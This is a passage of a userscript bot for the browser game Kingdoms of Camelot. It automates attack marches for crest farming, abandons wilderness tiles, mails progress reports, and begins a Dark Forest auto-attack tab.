    m += '<TD>Y: <INPUT id=pbcresty type=text size=3 maxlength=3 value="'+CrestOptions.Y+'"</td></tr></table>';
   
    m += '<TABLE class=pdxTab><TR><TD><b>1. '+culang.wave+'</b>: </td><TD><img  height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_2_50_s34.jpg title="'+culang.crestMMnote+'"></td><TD><INPUT id=R1MM type=text size=5 maxlength=6 value="'+CrestOptions.R1MM+'" ></td>';
    m += '</td><TD></td><TD><TD><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_10_50_s34.jpg></td><TD><INPUT id=R1Ball type=text size=5 maxlength=6 value="'+CrestOptions.R1Ball+'"</td>';
    m += '<TD><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_12_50_s34.jpg></td><TD><INPUT id=R1Cat type=text size=5 maxlength=6 value="'+CrestOptions.R1Cat+'"</td></tr>';
    
    m += '<TR><TD><b>2. '+culang.wave+'</b>: </td><TD><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_2_50_s34.jpg></td><TD><INPUT id=R2MM type=text size=5 maxlength=6 value="'+CrestOptions.R2MM+'"</td>';

    m += '<TD><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_4_50_s34.jpg></td><TD><INPUT id=R2Pike type=text size=5 maxlength=6 value="'+CrestOptions.R2Pike+'"</td>';
    m += '<TD><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_5_50_s34.jpg></td><TD><INPUT id=R2Sword type=text size=5 maxlength=6 value="'+CrestOptions.R2Sword+'"</td>';
    m += '<TD><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_6_50_s34.jpg></td><TD><INPUT id=R2Arch type=text size=5 maxlength=6 value="'+CrestOptions.R2Arch+'"</td>';
    m += '<TD><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_10_50_s34.jpg></td><TD><INPUT id=R2Ball type=text size=5 maxlength=6 value="'+CrestOptions.R2Ball+'"</td>';
    m += '<TD><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_11_50_s34.jpg></td><TD><INPUT id=R2Ram type=text size=5 maxlength=6 value="'+CrestOptions.R2Ram+'"</td>';
    m += '<TD><img height=20 src=http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_12_50_s34.jpg></td><TD><INPUT id=R2Cat type=text size=5 maxlength=6 value="'+CrestOptions.R2Cat+'"</td></tr></table>';
    
    t.myDiv.innerHTML = m;
	
	document.getElementById('pbsendcrestreport').addEventListener('change', function(){
		Options.crestreport = document.getElementById('pbsendcrestreport').checked;
		saveOptions();
	}, false);
	document.getElementById('pbsendcrestreportint').addEventListener('change', function(){
		Options.CrestMsgInterval = parseInt(document.getElementById('pbsendcrestreportint').value);
		saveOptions();
	}, false);
    
    for (var i=0;i<Seed.cities.length;i++){
		if (CrestOptions.CrestCity == Seed.cities[i][0]){
			selbut=i;
			break;
		}
	}
		
    t.tcp = new CdispCityPicker ('crestcityselect', document.getElementById('crestcity'), true, t.clickCitySelect, selbut); 
    if (CrestOptions.CrestCity == 0) {
    	CrestOptions.CrestCity = t.tcp.city.id
    	saveCrestOptions();
    }
         
    document.getElementById('crestcity').addEventListener('click', function(){CrestOptions.CrestCity = t.tcp.city.id;saveCrestOptions();} , false);
    document.getElementById('Cresttoggle').addEventListener('click', function(){t.toggleCrestState(this)} , false);
    document.getElementById('CrestHelp').addEventListener('click', function(){t.helpPop();} , false);
    document.getElementById('pbcrestx').addEventListener('change', function(){CrestOptions.X = document.getElementById('pbcrestx').value; saveCrestOptions();} , false);
    document.getElementById('pbcresty').addEventListener('change', function(){CrestOptions.Y = document.getElementById('pbcresty').value; saveCrestOptions()} , false);
    document.getElementById('R1MM').addEventListener('change', function(){CrestOptions.R1MM = document.getElementById('R1MM').value; saveCrestOptions()} , false);
    document.getElementById('R1Ball').addEventListener('change', function(){CrestOptions.R1Ball = document.getElementById('R1Ball').value; saveCrestOptions()} , false);
    document.getElementById('R1Cat').addEventListener('change', function(){CrestOptions.R1Cat = document.getElementById('R1Cat').value; saveCrestOptions()} , false);
    document.getElementById('R2MM').addEventListener('change', function(){CrestOptions.R2MM = document.getElementById('R2MM').value; saveCrestOptions()} , false);
    document.getElementById('R2Pike').addEventListener('change', function(){CrestOptions.R2Pike = document.getElementById('R2Pike').value; saveCrestOptions()} , false);
    document.getElementById('R2Sword').addEventListener('change', function(){CrestOptions.R2Sword = document.getElementById('R2Sword').value; saveCrestOptions()} , false);
    document.getElementById('R2Arch').addEventListener('change', function(){CrestOptions.R2Arch = document.getElementById('R2Arch').value; saveCrestOptions()} , false);
    document.getElementById('R2Ball').addEventListener('change', function(){CrestOptions.R2Ball = document.getElementById('R2Ball').value; saveCrestOptions()} , false);
    document.getElementById('R2Ram').addEventListener('change', function(){CrestOptions.R2Ram = document.getElementById('R2Ram').value; saveCrestOptions()} , false);
    document.getElementById('R2Cat').addEventListener('change', function(){CrestOptions.R2Cat = document.getElementById('R2Cat').value; saveCrestOptions()} , false);
  },
  
 helpPop : function (){
    var helpText = ''+culang.cresthelppop+'';
    
    var pop = new CPopup ('crestHelp', 0, 0, 746, 390, true);
    pop.centerMe (mainPop.getMainDiv());  
    pop.getMainDiv().innerHTML = helpText;
    pop.getTopDiv().innerHTML = '<div class=showBadged><CENTER><B>'+culang.crest+'</b></center></div>';
    pop.show (true);
  },
  
  toggleCrestState: function(obj){
		var t = Tabs.Crest;
        if (CrestOptions.Running == true) {
            CrestOptions.Running = false;
			obj.value = ""+culang.crest+" = "+culang.buttonoff+"";
            saveCrestOptions();
        }
        else {
            CrestOptions.Running = true;
			obj.value = ""+culang.crest+" = "+culang.buttonon+"";
            for (crest in Options.Creststatus){
            		owned = Seed.items['i'+crest];
            		if (owned == undefined) owned=0;
            		Options.Creststatus[crest] = owned;
            		Options.CrestLevel = 0;
            		Options.CrestType = 0;
            		Options.Crest1Count = 0;
            		Options.Crest2Count = 0;
            }
            var now = new Date().getTime()/1000.0;
            now = now.toFixed(0);
            Options.LastCrestReport = now;
            saveCrestOptions();
			setTimeout(function(){ t.Rounds(1,0);}, 5*1000);
        }
    },
    
    sendCrestReport: function(){
    	var t = Tabs.Crest;
    	if(!Options.crestreport || !CrestOptions.Running) return;
    	var now = new Date().getTime()/1000.0;
        now = now.toFixed(0);
        if (now < (parseInt(Options.LastCrestReport)+(Options.CrestMsgInterval*60*60))) return;
    	
    	var total = 0;
    	var wildtype = '';
    	switch (Options.CrestType) {
    			  case '10' : wildtype = unsafeWindow.g_js_strings.commonstr.grassland;break;
    			  case '11' : wildtype = unsafeWindow.g_js_strings.commonstr.lake;break;
    			  case '20' : wildtype = unsafeWindow.g_js_strings.commonstr.woods;break;
    			  case '30' : wildtype = unsafeWindow.g_js_strings.commonstr.hills;break;
    			  case '40' : wildtype = unsafeWindow.g_js_strings.commonstr.mountain;break;
    			  case '50' : wildtype = unsafeWindow.g_js_strings.commonstr.plain;break;
    	}
		var message = ''+culang.crestrpt+': %0A';
		    message += '%0A '+culang.crestrpt2+' '+ Options.CrestMsgInterval +' '+culang.crestrpt3+': '+Options.CrestLevel+' '+wildtype+'%0A';
        for (crest in Options.Creststatus){
        	owned = Seed.items['i'+crest];
        	if (owned == undefined) owned=0;
	      	if ( (owned - Options.Creststatus[crest]) > 0) message+= '<DIV><B>' + unsafeWindow.itemlist['i'+crest]['name'] +': '+ (owned - Options.Creststatus[crest]) +'%0A </b></div>';
	      	else message+= unsafeWindow.itemlist['i'+crest]['name'] +': '+ (owned - Options.Creststatus[crest]) +'%0A';
	    	total += (owned - Options.Creststatus[crest]);
	    	Options.Creststatus[crest] = owned;
      	}
    	message += '%0A '+culang.crestrpt4+': '+ total +'%0A';
    	message += '%0A 1. '+culang.wave+': '+ Options.Crest1Count +'%0A';
    	message += '2. '+culang.wave+': '+ Options.Crest2Count +'%0A';
		
    	Options.Crest1Count = 0;
    	Options.Crest2Count = 0;
    	
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
      params.emailTo = Seed.player['name'];
      params.subject = ""+culang.crestrpt+"";
      params.message = message;
      params.requestType = "COMPOSED_MAIL";
      new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/getEmail.php" + unsafeWindow.g_ajaxsuffix, {
          method: "post",
          parameters: params,
          onSuccess: function (message) {
              var rslt = eval("(" + message.responseText + ")");
              if (rslt.ok) {
              		Options.LastCrestReport = now;
              } else {
              }
          },
          onFailure: function () {
          },
      });
    	
      saveOptions();
    },
    
    getAtkKnight : function(cityID){
     var t = Tabs.Crest;
     t.knt = new Array();
     for (k in Seed.knights[cityID]){
     		if (Seed.knights[cityID][k]["knightStatus"] == 1 && Seed.leaders[cityID]["resourcefulnessKnightId"] != Seed.knights[cityID][k]["knightId"] && Seed.leaders[cityID]["politicsKnightId"] != Seed.knights[cityID][k]["knightId"] && Seed.leaders[cityID]["combatKnightId"] != Seed.knights[cityID][k]["knightId"] && Seed.leaders[cityID]["intelligenceKnightId"] != Seed.knights[cityID][k]["knightId"]){
     			t.knt.push ({
     				Name:   Seed.knights[cityID][k]["knightName"],
     				Combat:	parseInt(Seed.knights[cityID][k]["combat"]),
     				ID:		Seed.knights[cityID][k]["knightId"],
     			});
     		}
     }
     t.knt = t.knt.sort(function sort(a,b) {a = parseInt(a['Combat']);b = parseInt(b['Combat']);return a == b ? 0 : (a > b ? -1 : 1);});
  },
  
  getRallypointLevel: function(cityId){
    var t = Tabs.Crest;
    for (var o in Seed.buildings[cityId]){
  	var buildingType = parseInt(Seed.buildings[cityId][o][0]);
  	var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
  	if (buildingType == 12) t.rallypointlevel=parseInt(buildingLevel);
     }
  },

  FirstRound: function(){
      var t = Tabs.Crest;
      var buzy = false;
      if (!CrestOptions.Running) return;
      cityID = 'city' + CrestOptions.CrestCity;
      var abandon=0;
      for (var k in Seed.wilderness[cityID] ){
           if (Seed.wilderness[cityID][k]['xCoord']==CrestOptions.X && Seed.wilderness[cityID][k]['yCoord']==CrestOptions.Y && t.error_code!=401) {
             t.abandonWilderness(Seed.wilderness[cityID][k]['tileId'],Seed.wilderness[cityID][k]['xCoord'],Seed.wilderness[cityID][k]['yCoord'],CrestOptions.CrestCity);
           }
      }
      if (parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R1MM || parseInt(Seed.units[cityID]['unt10']) < CrestOptions.R1Ball || parseInt(Seed.units[cityID]['unt12']) < CrestOptions.R1Cat || parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R1MM || parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R2MM || parseInt(Seed.units[cityID]['unt4']) < CrestOptions.R2Pike || parseInt(Seed.units[cityID]['unt5']) < CrestOptions.R2Sword || parseInt(Seed.units[cityID]['unt6']) < CrestOptions.R2Arch || parseInt(Seed.units[cityID]['unt10']) < CrestOptions.R2Ball || parseInt(Seed.units[cityID]['unt11']) < CrestOptions.R2Ram || parseInt(Seed.units[cityID]['unt12']) < CrestOptions.R2Cat) return;
      for (var k in Seed.queue_atkp[cityID]){
        if (Seed.queue_atkp[cityID][k]['toXCoord']==CrestOptions.X && Seed.queue_atkp[cityID][k]['toYCoord']==CrestOptions.Y)  buzy=true;
      }
      if (!buzy)  {
        CrestOptions.RoundOne=true;
        CrestOptions.RoundTwo=true;
        saveCrestOptions();
      }
      if(!CrestOptions.RoundOne) return;
      
      if (CrestOptions.R1MM == 0 && CrestOptions.R1Ball==0 && CrestOptions.R1Cat==0){
      CrestOptions.RoundOne = false;
      saveCrestOptions();
      setTimeout (function(){t.SecondRound();}, 1000);
      return;
      }
      
      t.getAtkKnight(cityID);
      slots=0;
       for (z in Seed.queue_atkp[cityID]){
             slots++;
       }
       if  (Seed.queue_atkp[cityID].toSource() == "[]") slots=0;
       t.getRallypointLevel(cityID);     
       if ((t.rallypointlevel) <= slots)return;
       
       if  (t.knt.toSource() == "[]") {return;}  
       var kid = t.knt[0].ID;
       
       var now = new Date().getTime()/1000.0;
       now = now.toFixed(0)
		
	   if (CrestOptions.R1MM > parseInt(Seed.units[cityID]['unt2']) || CrestOptions.R1Ball > parseInt(Seed.units[cityID]['unt10']) || CrestOptions.R1Cat > parseInt(Seed.units[cityID]['unt12'])){return;}
          
	    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  		params.cid=CrestOptions.CrestCity;
  		params.type=4;
  	    params.kid=kid;
  		params.xcoord = CrestOptions.X;
  		params.ycoord = CrestOptions.Y;
        if (now < (parseInt(CrestOptions.lastRoundTwo) + 300)) { 
        	params.u2= (CrestOptions.R1MM / 10);
        	params.u2 = params.u2.toFixed(0);	
        	if (params.u2 < (CrestOptions.R1MM / 10)) params.u2++;
			params.u10=CrestOptions.R1Ball;
			params.u12=CrestOptions.R1Cat;
        }	
  		else params.u2= CrestOptions.R1MM;
  		params.u10=CrestOptions.R1Ball;
  		params.u12=CrestOptions.R1Cat;
  		
  		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
  		         method: "post",
  		         parameters: params,
  		         loading: true,
  		         onSuccess: function (transport) {
  		         var rslt = eval("(" + transport.responseText + ")");
  		         if (rslt.ok) {
  		         var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
  		         var ut = unsafeWindow.unixtime();
  		         var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
  		         var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];
  		         for(i = 0; i <= unitsarr.length; i++){
  		         	if(params["u"+i]){
  		         	unitsarr[i] = params["u"+i];
  		         	}
  		         }
  		         var currentcityid = params.cid;
  		         unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
  		         unsafeWindow.update_seed(rslt.updateSeed)
  		         if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
  		         CrestOptions.RoundOne = false;
  		         Options.Crest1Count++;
  		         Options.CrestLevel = rslt.tileLevel;
  		         Options.CrestType = rslt.tileType;
  		         saveCrestOptions();
  		         setTimeout (function(){t.SecondRound();}, 10000);
               } else {
               		//setTimeout (function(){t.FirstRound();}, 5000);
  		         //unsafeWindow.Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
  		         }
  		         },
  		         onFailure: function () {}
  		 });
  		 
  	 },
     
     	 
    SecondRound: function(){
      var t = Tabs.Crest;
      if (!CrestOptions.Running || !CrestOptions.RoundTwo) return;
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
      cityID = 'city' + CrestOptions.CrestCity;
      if (parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R1MM || parseInt(Seed.units[cityID]['unt10']) < CrestOptions.R1Ball || parseInt(Seed.units[cityID]['unt12']) < CrestOptions.R1Cat || parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R1MM || parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R2MM || parseInt(Seed.units[cityID]['unt4']) < CrestOptions.R2Pike || parseInt(Seed.units[cityID]['unt5']) < CrestOptions.R2Sword || parseInt(Seed.units[cityID]['unt6']) < CrestOptions.R2Arch || parseInt(Seed.units[cityID]['unt10']) < CrestOptions.R2Ball || parseInt(Seed.units[cityID]['unt11']) < CrestOptions.R2Ram || parseInt(Seed.units[cityID]['unt12']) < CrestOptions.R2Cat) return;
      
      t.getAtkKnight(cityID);
      slots=0;
       for (z in Seed.queue_atkp[cityID]){
             slots++;
       }
       if  (Seed.queue_atkp[cityID].toSource() == "[]") slots=0;
       t.getRallypointLevel(cityID);
       if ((t.rallypointlevel) <= slots)return;
          
       if  (t.knt.toSource() == "[]") {return;}  
       var kid = t.knt[0].ID;

  		params.cid=CrestOptions.CrestCity;
  		params.type=4;
  	  	params.kid=kid;
  		params.xcoord = CrestOptions.X;
  		params.ycoord = CrestOptions.Y;
  		params.u2=CrestOptions.R2MM;
  		params.u4=CrestOptions.R2Pike;
  		params.u5=CrestOptions.R2Sword;
  		params.u6=CrestOptions.R2Arch;
  		params.u10=CrestOptions.R2Ball;
  		params.u11=CrestOptions.R2Ram;
  		params.u12=CrestOptions.R2Cat;
  		
  		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
  		         method: "post",
  		         parameters: params,
  		         loading: true,
  		         onSuccess: function (transport) {
  		         var rslt = eval("(" + transport.responseText + ")");
  		         if (rslt.ok) {
  		         var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
  		         var ut = unsafeWindow.unixtime();
  		         var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
  		         var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];
  		         for(i = 0; i <= unitsarr.length; i++){
  		         	if(params["u"+i]){
  		         	unitsarr[i] = params["u"+i];
  		         	}
  		         }
  		         var currentcityid = params.cid;
  		         unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
  		         unsafeWindow.update_seed(rslt.updateSeed);
  		         if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
  		         CrestOptions.RoundTwo = false;
               var now = new Date().getTime()/1000.0;
               now = now.toFixed(0);
               CrestOptions.lastRoundTwo = now;
               Options.Crest2Count++;
  		         saveCrestOptions();
               } else {
               setTimeout (function(){t.SecondRound();}, 5000);
  		         //unsafeWindow.Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
  		         }
  		         },
  		         onFailure: function () {}
  		 });
  		 },
  	

	Rounds: function(r, retry){
		var t = Tabs.Crest;
		if (!CrestOptions.Running) return;
		cityID = 'city' + CrestOptions.CrestCity;
		retry++;
		logit('autocrest '+r+' '+retry);
		if(retry>50){
			reloadKOC(); //Reload if too many errors
		}
		
		for (var k in Seed.wilderness[cityID] ){
		   if (Seed.wilderness[cityID][k]['xCoord']==CrestOptions.X && Seed.wilderness[cityID][k]['yCoord']==CrestOptions.Y && t.error_code!=401) {
			 t.abandonWilderness(Seed.wilderness[cityID][k]['tileId'],Seed.wilderness[cityID][k]['xCoord'],Seed.wilderness[cityID][k]['yCoord'],CrestOptions.CrestCity,t.Rounds,retry);
			 return;
		   }
		}
		
		if (parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R1MM || parseInt(Seed.units[cityID]['unt10']) < CrestOptions.R1Ball || parseInt(Seed.units[cityID]['unt12']) < CrestOptions.R1Cat || parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R1MM || parseInt(Seed.units[cityID]['unt2']) < CrestOptions.R2MM || parseInt(Seed.units[cityID]['unt4']) < CrestOptions.R2Pike || parseInt(Seed.units[cityID]['unt5']) < CrestOptions.R2Sword || parseInt(Seed.units[cityID]['unt6']) < CrestOptions.R2Arch || parseInt(Seed.units[cityID]['unt10']) < CrestOptions.R2Ball || parseInt(Seed.units[cityID]['unt11']) < CrestOptions.R2Ram || parseInt(Seed.units[cityID]['unt12']) < CrestOptions.R2Cat){
			setTimeout(function(){ t.Rounds(r,retry);},20000);
			return;
		}
		
		t.getAtkKnight(cityID);
      slots=0;
       for (z in Seed.queue_atkp[cityID]){
             slots++;
       }
       if  (Seed.queue_atkp[cityID].toSource() == "[]") slots=0;
       t.getRallypointLevel(cityID);     
       if ((t.rallypointlevel) <= slots){
			setTimeout(function(){ t.Rounds(r,retry);},20000);
			return;
		}
       // if (t.rallypointlevel == slots) return;
       
       if  (t.knt.toSource() == "[]"){
			setTimeout(function(){ t.Rounds(r,retry);},20000);
			return;
		} 
       var kid = t.knt[0].ID;
       
       var now = new Date().getTime()/1000.0;
       now = now.toFixed(0);
		if (now > (parseInt(CrestOptions.lastRoundTwo) + 300)) {
			r=1;
		}
		
		switch(r){
			case 1:
				if ((t.rallypointlevel-slots) < 2){
					setTimeout(function(){ t.Rounds(r,retry);},20000);
					return;
				}
				var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
				params.cid=CrestOptions.CrestCity;
				params.type=4;
				params.kid=kid;
				params.xcoord = CrestOptions.X;
				params.ycoord = CrestOptions.Y;
				if (now < (parseInt(CrestOptions.lastRoundTwo) + 300)) { 
					params.u2= (CrestOptions.R1MM / 10);
					params.u2 = params.u2.toFixed(0);	
					if (params.u2 < (CrestOptions.R1MM / 10)) params.u2++;
					params.u10=CrestOptions.R1Ball;
					params.u12=CrestOptions.R1Cat;
				}	
				else{
					params.u2= CrestOptions.R1MM;
					params.u10=CrestOptions.R1Ball;
					params.u12=CrestOptions.R1Cat;
				}
				t.sendMarch(params,t.Rounds,r,retry);
				break;
			default:
				var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
				params.cid=CrestOptions.CrestCity;
				params.type=4;
				params.kid=kid;
				params.xcoord = CrestOptions.X;
				params.ycoord = CrestOptions.Y;
				params.u2=CrestOptions.R2MM;
				params.u4=CrestOptions.R2Pike;
				params.u5=CrestOptions.R2Sword;
				params.u6=CrestOptions.R2Arch;
				params.u10=CrestOptions.R2Ball;
				params.u11=CrestOptions.R2Ram;
				params.u12=CrestOptions.R2Cat;
				t.sendMarch(params,t.Rounds,r,retry);
				break;
		
		}
	
	},
		
	sendMarch: function(p,callback,r,retry){
		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
			 method: "post",
			 parameters: p,
			 loading: true,
			 onSuccess: function (transport) {
			 var rslt = eval("(" + transport.responseText + ")");
			 if (rslt.ok) {
			 var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
			 var ut = unsafeWindow.unixtime();
			 var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
			 var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];
			 for(i = 0; i <= unitsarr.length; i++){
				if(p["u"+i]){
				unitsarr[i] = p["u"+i];
				}
			 }
			 var currentcityid = p.cid;
			 unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, p.xcoord, p.ycoord, unitsarr, p.type, p.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
			 unsafeWindow.update_seed(rslt.updateSeed)
			 if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
			 GM_log(r);
			 if(r==1){
				Options.Crest1Count++;
				r = 2;
			} else{
			   Options.Crest2Count++;
			}
				var now = new Date().getTime()/1000.0;
               now = now.toFixed(0);
               CrestOptions.lastRoundTwo = now;
			 Options.CrestLevel = rslt.tileLevel;
			 Options.CrestType = rslt.tileType;
			 saveCrestOptions();
			 setTimeout (function(){callback(r,0);}, 5000);
		   } else {
				//setTimeout (function(){t.FirstRound();}, 5000);
			 //unsafeWindow.Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
			if(rslt.user_action){
				new CdialogCancelContinue('<SPAN class=boldRed>'+culang.captchaAlert+'</span>', null, null, mainPop.getMainDiv);
				setTimeout (function(){callback(r,retry);}, 1*60*1000);
			}
			 setTimeout (function(){callback(r,retry);}, 5000);
			 }
			 },
			 onFailure: function () {}
  		 });
	},
  	abandonWilderness: function(tid,x,y,cid,callback,retry){
      var t = Tabs.Crest;
      if (!CrestOptions.Running) return;
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
      var cityID = cid;
	  var tileid = tid;
      params.tid=tid;
  	  params.cid=cid;
  	  params.x=x;
  		params.y=y;
  		  		
  		new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/abandonWilderness.php" + unsafeWindow.g_ajaxsuffix, {
  		         method: "post",
  		         parameters: params,
  		         loading: true,
  		         onSuccess:function(transport){
				var rslt=eval("("+transport.responseText+")");
				  if (rslt.ok) {
				  	 t.error_code = 0;
				     CrestOptions.RoundOne = true;
				     CrestOptions.RoundTwo = true;
				     saveCrestOptions();
				      if (rslt.returningMarches) {
				          var cities = Object.keys(rslt.returningMarches);
				          for (var i = 0; i < cities.length; i++) {
				              for (var j = 0; j < rslt.returningMarches[cities[i]].length; j++) {
				                  var cid = cities[i].split("c")[1];
				                  var mid = rslt.returningMarches[cities[i]][j];
				                  var march = Seed.queue_atkp["city" + cid]["m" + mid];
				                  if (march) {
				                      var marchtime = Math.abs(parseInt(march.destinationUnixTime) - parseInt(march.marchUnixTime));
				                      var ut = unsafeWindow.unixtime();
				                      Seed.queue_atkp["city" + cid]["m" + mid].destinationUnixTime = ut;
				                      Seed.queue_atkp["city" + cid]["m" + mid].marchUnixTime = ut - marchtime;
				                      Seed.queue_atkp["city" + cid]["m" + mid].returnUnixTime = ut + marchtime;
				                      Seed.queue_atkp["city" + cid]["m" + mid].marchStatus = 8
				                  }
				              }
				          }
				      }
				      if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
				      
				      if (Object.keys(Seed.wilderness["city" + cityID]).length == 1) {
				          Seed.wilderness["city" + cityID] = []
  		         	  } else{
  		         	  	delete Seed.wilderness["city"+cityID]["t"+tileid];
  		         	  }
					  setTimeout (function(){callback(1,0);}, 10000);
               } else {
               		if (rslt.error_code != 401) {
               		    t.error_code = rslt.error_code; 
               			// setTimeout (function(){t.abandonWilderness(tid,x,y,cid);}, 5000);
               		}
					setTimeout (function(){callback(1,retry);}, 10000);
  		        }
				
  		         },
  		         onFailure: function () {}
  		 });


    },
    
  hide : function (){
    var t = Tabs.Crest;
	   mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },

  show : function (){
  var t = Tabs.Crest;
      mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
 };
/***********************************************************************************/
/************ KOC POWER - TABS DARK FOREST ****************************************/
/*********************************************************************************/
Tabs.DarkForest = {
  tabLabel: culang.darkforest,
  tabOrder : StyleOptions.toDarkForest,
  myDiv : null,
  MapAjax : new CMapAjax(),
  popFirst : true,
  opt : {},
  nextattack : null,
  searchRunning : false,
  tilesSearched : 0,
  tilesFound : 0,
  curX : 0,
  curY : 0,
  lastX : 0,
  firstX : 0,
  firstY : 0,
  lastY : 0,
  rallypointlevel:0,
  knt:{},
  barbArray:{},
  lookup:1,
  city:0,
  deleting:false,
  
  init : function (div){
    var t = Tabs.DarkForest;
    t.myDiv = div;
 
    var m = '<DIV id=pbTowrtDivF class=pdxStat>'+culang.Hdf+'</div><TABLE id=pbbarbingfunctions width=100% height=0% class=pdxTab><TR align="center">';
	 if (AttackOptions.Running == false) {
	       m += '<TD><INPUT id=AttSearch type=submit value="'+culang.darkforest+' = '+culang.buttonoff+'"></td>';
	   } else {
	       m += '<TD><INPUT id=AttSearch type=submit value="'+culang.darkforest+' = '+culang.buttonon+'"></td>';
	   }
	  m += '<TD><INPUT id=troopselect type=submit value="'+culang.units+'"></td>';
	  m += '<TD><INPUT id=Options type=submit value="'+culang.options+'"></td>';
	  m += '</tr></table>	';  
	 m += '<span class=boldRed>'+culang.impo+'</span>: <b>'+culang.DFimpnote+'</b> <BR>';
     m += ' <span class=boldRed>'+culang.impnote+'</span>: <b>'+culang.DFimpnote2+'</b></div>';
	  
	  m += '<DIV id=pbTraderDivD class=pdxStat>'+culang.Hdfstats+'</div>';
	
	  m += '<TABLE id=pbbarbstats width=95% height=0% class=pdxTab><TR align="left"><TR>';
	  for(i=0;i<Seed.cities.length;i++){
	  		m += '<TD>' + Seed.cities[i][1] +'</td>';
	  }
	  m+='</tr><TR>';
	  for(i=0;i<Seed.cities.length;i++){
	  		m += '<TD><DIV><span id='+ 'pdtotalcity' + i +'></span></div></td>';
	  }
	  m+='</tr><TR>';
	  for(i=0;i<Seed.cities.length;i++){
	  		m += '<TD><DIV><span id='+ 'pddatacity' + i +'></span></div></td>';
	  }
	  m+='</tr><TR>'
	   for(i=0;i<Seed.cities.length;i++){
	  		m += '<TD><DIV><span id='+ 'pddataarray' + i +'></span></div></td>';
	 }
	 m+='</tr></table><TABLE id=pbbarbstats width=95% height=0% class=pdxTab><TR align="left"><TR>';
	 for (i=0;i<=6;i++) {
	 	m+='<TD><DIV><span id='+ 'pberror' + i +'></span></div></td>';
     }
     m+='</tr></table>';
     m += '<DIV id=pbTraderDivD class=pdxStat>'+culang.Hdfopt+'</div>';
     m += '<TABLE width=95% height=0% class=pdxTab><TR align="left">';
     for(i=0;i<Seed.cities.length;i++){
        m += '<TR><TD>' + Seed.cities[i][1] +'</td>';
        for (w=1;w<=10;w++){
           m += '<TD class=pblevelopt><INPUT id=pbcity'+i+'level'+w+' type=checkbox unchecked=true>'+culang.lvl+':'+w+'</td>';
        }		
        		
     }

     t.myDiv.innerHTML = m;

     saveAttackOptions();
	 t.checkBarbData();

     for(i=0;i<Seed.cities.length;i++){
		var element = 'pdtotalcity'+i;
		if (t.barbArray[i+1] == undefined) document.getElementById(element).innerHTML = ''+culang.DFnodata+'';
		else document.getElementById(element).innerHTML =  ''+culang.forests+':' + t.barbArray[i+1].length;
     }
    
    for(i=0;i<Seed.cities.length;i++){
		for (w=1;w<=10;w++){
			document.getElementById('pbcity'+i+'level'+w).checked = AttackOptions.Levels[i+1][w]; 
		}
    }
    
	document.getElementById('AttSearch').addEventListener('click', function(){t.toggleBarbState(this)} , false);
